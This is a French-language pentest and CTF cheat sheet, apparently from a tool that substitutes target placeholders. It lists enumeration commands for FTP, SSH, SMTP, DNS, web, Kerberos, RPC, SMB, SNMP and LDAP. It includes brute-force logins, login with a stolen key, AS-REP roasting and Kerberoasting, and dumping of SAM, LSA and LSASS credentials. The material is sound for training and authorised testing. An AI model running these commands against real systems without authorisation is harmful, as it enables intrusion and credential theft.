# 1 - Énumération des services (1/2)

Cette page couvre les dix services les plus courants rencontrés sur un réseau interne ou en CTF. Pour chaque service, on part du scénario sans authentification (sessions nulles, comptes par défaut, anonyme) puis on bascule vers l'énumération authentifiée dès que des identifiants sont disponibles. Chaque action renvoie vers la documentation de référence vérifiée (HackTricks, PayloadsAllTheThings, pages outils officielles).

!!! note "Jetons"
    Les commandes utilisent des variables substituées automatiquement par l'application : `{IP}` (cible), `{DOMAIN}` (domaine), `{DC}` (contrôleur de domaine), `{URL}` (URL web), `{USER}` et `{PASS}` (identifiants). Les badges de prérequis (`needs`) indiquent ce qu'il faut avoir obtenu au préalable : **USER** (liste d'utilisateurs), **CREDS** (login + mot de passe en clair), **HASH** (hash NT pour pass-the-hash), **AUTH** (authentification possible, mot de passe OU hash NT), **ADMIN** (droits d'administrateur local).

## 21 - FTP

Service de transfert de fichiers. Testez d'abord le login **anonymous**, puis tout identifiant découvert.

!!! info "Références"
    - [HackTricks - Pentesting FTP](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ftp/index.html)
    - [GTFOBins - ftp](https://gtfobins.github.io/gtfobins/ftp/)
    - [Nmap NSE - ftp-anon](https://nmap.org/nsedoc/scripts/ftp-anon.html)

### Anonymous login

```
ftp {IP}
# user: anonymous / pass: anonymous
```

### Recursive download (anon)

```
wget -r --no-passive ftp://anonymous:anonymous@{IP}/
```

**Voir aussi :** [Kali - wget](https://www.kali.org/tools/wget/)

### nmap scripts

```
sudo nmap -p21 --script ftp-anon,ftp-bounce,ftp-syst {IP}
```

**Voir aussi :** [Nmap NSE - ftp-anon](https://nmap.org/nsedoc/scripts/ftp-anon.html)

### Authenticated login (requiert : CREDS)

```
lftp -u {USER},{PASS} {IP}
```

### Brute force (if authorized)

```
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://{IP} -t 4
```

**Voir aussi :** [Kali - hydra](https://www.kali.org/tools/hydra/)

## 22 - SSH

Rarement exploitable directement - cherchez des identifiants ou des clés. Vérifiez la version (CVE potentielles).

!!! info "Références"
    - [HackTricks - Pentesting SSH](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ssh.html)
    - [GTFOBins - ssh](https://gtfobins.github.io/gtfobins/ssh/)
    - [man.openbsd.org - ssh(1)](https://man.openbsd.org/ssh)

### Banner / algos

```
nc -vn {IP} 22
ssh -v {IP}
```

### Password login (requiert : CREDS)

```
ssh {USER}@{IP}
```

### Login with a stolen key

```
chmod 600 id_rsa; ssh -i id_rsa {USER}@{IP}
```

### Targeted brute force (requiert : USER)

```
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://{IP} -t 4
```

**Voir aussi :** [Kali - hydra](https://www.kali.org/tools/hydra/)

## 25 - SMTP / Mail

Énumérez les utilisateurs via les commandes VRFY / RCPT, et testez l'open relay.

!!! info "Références"
    - [HackTricks - Pentesting SMTP](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smtp/index.html)
    - [Kali - smtp-user-enum](https://www.kali.org/tools/smtp-user-enum/)

### User enumeration

```
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t {IP}
```

**Voir aussi :** [Kali - smtp-user-enum](https://www.kali.org/tools/smtp-user-enum/)

### Banner / open relay

```
nc -vn {IP} 25
# VRFY root ? open-relay ?
```

## 53 - DNS

Tentez un transfert de zone (AXFR), énumérez les enregistrements et brute-forcez les sous-domaines.

!!! info "Références"
    - [HackTricks - Pentesting DNS](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-dns.html)
    - [Kali - bind9 (dig)](https://www.kali.org/tools/bind9/)
    - [RFC 8482 - refus de la requête ANY](https://datatracker.ietf.org/doc/html/rfc8482)

### Zone transfer

```
dig axfr @{IP} {DOMAIN}
```

### Records (ANY is refused/RFC8482 → targeted types)

```
for r in A AAAA NS MX TXT SOA CNAME SRV; do echo "== $r =="; dig +short $r {DOMAIN} @{IP}; done
```

**Voir aussi :** [RFC 8482](https://datatracker.ietf.org/doc/html/rfc8482)

### Subdomain brute force

```
gobuster dns -d {DOMAIN} -r {IP} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
```

**Voir aussi :** [Kali - gobuster](https://www.kali.org/tools/gobuster/)

## 80/443 - Web

La plus grande surface d'attaque. Fuzzez systématiquement fichiers, répertoires et vhosts.

!!! info "Références"
    - [HackTricks - Pentesting Web](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/index.html)
    - [PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/)
    - [Kali - whatweb](https://www.kali.org/tools/whatweb/)

### Response headers (server / techno / redirects)

```
curl -sI {URL}
curl -sI -L {URL}
# look at Server, X-Powered-By, Location, Set-Cookie, CSP
```

### Sensitive files

```
curl {URL}/robots.txt
curl {URL}/sitemap.xml
curl {URL}/.git/HEAD
```

### Fingerprint / WAF

```
whatweb -a 3 {URL}
nikto -h {URL}
wafw00f {URL}
```

**Voir aussi :** [Kali - whatweb](https://www.kali.org/tools/whatweb/) · [Kali - nikto](https://www.kali.org/tools/nikto/) · [wafw00f (GitHub)](https://github.com/EnableSecurity/wafw00f)

### Directory brute force (pick one tool)

```
feroxbuster -u {URL} -w {WORDLIST} -x php,html,txt -t 50          # recursive
ffuf -u {URL}/FUZZ -w {WORDLIST} -e .php,.html,.txt -mc 200,301,302,403
gobuster dir -u {URL} -w {WORDLIST} -x php,html,txt,bak -t 50
dirsearch -u {URL} -e php,html,txt -x 404
wfuzz -c -w {WORDLIST} --hc 404 {URL}/FUZZ
```

**Voir aussi :** [Kali - feroxbuster](https://www.kali.org/tools/feroxbuster/) · [ffuf (GitHub)](https://github.com/ffuf/ffuf) · [dirsearch (GitHub)](https://github.com/maurosoria/dirsearch)

### Vhosts

```
gobuster vhost -u {URL} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain -t 50
```

**Voir aussi :** [Kali - gobuster](https://www.kali.org/tools/gobuster/)

### Vulnerability scan

```
nuclei -u {URL} -s critical,high,medium
```

**Voir aussi :** [Nuclei - documentation](https://docs.projectdiscovery.io/opensource/nuclei/overview)

## 88 - Kerberos / AD

Le port 88 indique un contrôleur de domaine. Pivotez vers l'énumération Active Directory.

!!! info "Références"
    - [HackTricks - Pentesting Kerberos (88)](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-kerberos-88/index.html)
    - [Kerbrute (GitHub)](https://github.com/ropnop/kerbrute)
    - [The Hacker Recipes - AS-REP roasting](https://www.thehacker.recipes/ad/movement/kerberos/asreproast)

### User enum without creds (Kerbrute)

```
kerbrute userenum -d {DOMAIN} --dc {DC} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

**Voir aussi :** [Kerbrute (GitHub)](https://github.com/ropnop/kerbrute)

### AS-REP roasting (users without pre-auth, NO password required) (requiert : USER)

```
impacket-GetNPUsers {DOMAIN}/ -dc-ip {IP} -no-pass -usersfile users.txt -format hashcat -outputfile asrep.txt
```

**Voir aussi :** [Impacket (GitHub)](https://github.com/fortra/impacket) · [The Hacker Recipes - AS-REP roasting](https://www.thehacker.recipes/ad/movement/kerberos/asreproast)

### Prepare krb5.conf + TGT (requiert : CREDS)

```
netexec smb {DC} -u {USER} -p {PASS} -k --generate-krb5-file krb5.conf
sudo cp krb5.conf /etc/krb5.conf
kinit {USER}
klist
```

**Voir aussi :** [NetExec (GitHub)](https://github.com/Pennyw0rth/NetExec)

## 135 - MSRPC

Énumérez les comptes et les endpoints exposés via RPC.

!!! info "Références"
    - [HackTricks - 135 Pentesting MSRPC](https://book.hacktricks.wiki/en/network-services-pentesting/135-pentesting-msrpc.html)
    - [enum4linux-ng (GitHub)](https://github.com/cddmp/enum4linux-ng)
    - [Impacket (GitHub)](https://github.com/fortra/impacket)

### rpcclient null session

```
rpcclient -U '' -N {IP}
# > enumdomusers / enumdomgroups / queryuser 0x...
```

**Voir aussi :** [Kali - samba (rpcclient)](https://www.kali.org/tools/samba/)

### Auto enumeration

```
enum4linux-ng -A {IP}
```

**Voir aussi :** [enum4linux-ng (GitHub)](https://github.com/cddmp/enum4linux-ng)

### Dump RPC endpoints

```
impacket-rpcdump {IP}
```

**Voir aussi :** [Impacket (GitHub)](https://github.com/fortra/impacket)

## 139/445 - SMB / NetBIOS

Session nulle d'abord, puis énumération authentifiée dès que des identifiants sont disponibles.

!!! info "Références"
    - [HackTricks - Pentesting SMB](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html)
    - [NetExec - wiki](https://www.netexec.wiki/)
    - [The Hacker Recipes - Dump SAM & LSA secrets](https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets)

### Shares (null / guest)

```
nxc smb {IP} -u '' -p '' --shares
nxc smb {IP} -u 'guest' -p '' --shares
smbclient -L //{IP}/ -N
```

**Voir aussi :** [NetExec (GitHub)](https://github.com/Pennyw0rth/NetExec) · [Kali - samba (smbclient)](https://www.kali.org/tools/samba/)

### RID brute → user list

```
nxc smb {IP} -u '' -p '' --rid-brute | grep 'SidTypeUser' | awk -F'\\' '{print $2}' | awk '{print $1}' > users.txt
```

**Voir aussi :** [NetExec - wiki](https://www.netexec.wiki/)

### Known vulns

```
sudo nmap -p445 --script smb-vuln-* {IP}
# EternalBlue (MS17-010), SMBGhost…
```

**Voir aussi :** [Nmap NSE - smb-vuln-ms17-010](https://nmap.org/nsedoc/scripts/smb-vuln-ms17-010.html)

### Authenticated enumeration (shares + users + pols) (requiert : AUTH)

```
nxc smb {IP} -u {USER} -p {PASS} --shares --users --pass-pol
```

**Voir aussi :** [NetExec - wiki](https://www.netexec.wiki/)

### Spider readable shares (requiert : AUTH)

```
nxc smb {IP} -u {USER} -p {PASS} -M spider_plus
```

### Connect to a share (requiert : AUTH)

```
smbclient //{IP}/<share> -U '{DOMAIN}/{USER}%{PASS}'
# mget *  to grab everything
```

**Voir aussi :** [Kali - samba (smbclient)](https://www.kali.org/tools/samba/)

### Dump SAM / LSA / LSASS (local admin) (requiert : ADMIN)

```
nxc smb {IP} -u {USER} -p {PASS} --local-auth --sam --lsa
nxc smb {IP} -u {USER} -p {PASS} -M lsassy
```

**Voir aussi :** [The Hacker Recipes - Dump SAM & LSA secrets](https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets)

## 161 - SNMP (UDP)

Communautés par défaut fréquentes : **public** / **private**.

!!! info "Références"
    - [HackTricks - Pentesting SNMP](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/index.html)
    - [Kali - onesixtyone](https://www.kali.org/tools/onesixtyone/)
    - [Kali - net-snmp (snmpwalk)](https://www.kali.org/tools/net-snmp/)

### Brute community string

```
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt {IP}
```

**Voir aussi :** [Kali - onesixtyone](https://www.kali.org/tools/onesixtyone/)

### Full walk

```
snmpwalk -v2c -c public {IP}
snmpbulkwalk -v2c -c public {IP} .1
```

**Voir aussi :** [Kali - net-snmp](https://www.kali.org/tools/net-snmp/)

### Targeted extraction

```
snmp-check {IP} -c public
```

**Voir aussi :** [Kali - snmpcheck](https://www.kali.org/tools/snmpcheck/)

## 389/636 - LDAP / LDAPS

L'énumération anonyme est parfois ouverte ; sinon, passez en authentifié.

!!! info "Références"
    - [HackTricks - Pentesting LDAP](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ldap.html)
    - [ldapdomaindump (GitHub)](https://github.com/dirkjanm/ldapdomaindump)
    - [OpenLDAP - ldapsearch(1)](https://www.openldap.org/software/man.cgi?query=ldapsearch)

### Anonymous enumeration

```
nxc ldap {IP} -u '' -p '' --users
ldapsearch -x -H ldap://{IP} -b 'DC=target,DC=local' '(objectClass=user)' sAMAccountName
```

**Voir aussi :** [NetExec - wiki](https://www.netexec.wiki/) · [OpenLDAP - ldapsearch(1)](https://www.openldap.org/software/man.cgi?query=ldapsearch)

### Descriptions (cleartext passwords frequent) (requiert : AUTH)

```
nxc ldap {IP} -u {USER} -p {PASS} -M get-desc-users
```

**Voir aussi :** [NetExec - wiki](https://www.netexec.wiki/)

### AS-REP-able / Kerberoastable accounts (requiert : AUTH)

```
nxc ldap {IP} -u {USER} -p {PASS} --asreproast asrep.txt --kerberoasting kerb.txt
```

**Voir aussi :** [The Hacker Recipes - Kerberoast](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast)

### Full LDAP dump (ldapdomaindump) (requiert : AUTH)

```
ldapdomaindump -u '{DOMAIN}\\{USER}' -p {PASS} {IP} -o ldapdump/
```

**Voir aussi :** [ldapdomaindump (GitHub)](https://github.com/dirkjanm/ldapdomaindump) · [Kali - python-ldapdomaindump](https://www.kali.org/tools/python-ldapdomaindump/)
